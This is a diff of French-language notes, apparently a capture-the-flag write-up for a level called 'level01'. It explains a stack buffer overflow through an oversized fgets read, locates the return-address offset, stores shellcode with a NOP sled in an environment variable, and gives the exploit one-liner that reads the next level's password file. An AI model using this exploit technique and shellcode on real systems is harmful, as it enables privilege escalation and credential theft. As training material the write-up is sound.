@@ -1,3 +1,9 @@
+Idée : exploiter un fgets avec buffer trop long pour réeécrire EIP et appeler un shellcode en variable d'environnement
+
+- on remarque assez vite que l'username doit être dat_will
+- on remarque que le fgets du password accepte 100 caractères alors que le buffer n'est qque de 64 caractères
+
+
 - on remarque un segfault aux UUUU quand password = AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
 - on peut donc ecrire l'adresse que l'on veut a cet endroit, elle sera executee
 - on choisit d'ouvrir un shell enregistre en variable d'environnement
@@ -8,4 +14,7 @@ export SHELLCODE=$(python -c 'print "\x90"*100 + "\xeb\x1f\x5e\x89\x76\x08\x31\x
 adresse de SHELLCODE : 0xffffd84e
 une adresse d'un NOP  : 0xffffd87e
 
-(python -c 'print "dat_will"'; python -c 'import struct; print "A"*80 + struct.pack("I", 0xffffd87e)'; cat) | ./level01
+
+=========================================================================================================================================================
+
+(python -c 'print "dat_will"'; python -c 'import struct; print "A"*80 + struct.pack("I", 0xffffd87e)'; echo 'cat /home/users/level02/.pass') | ./level01
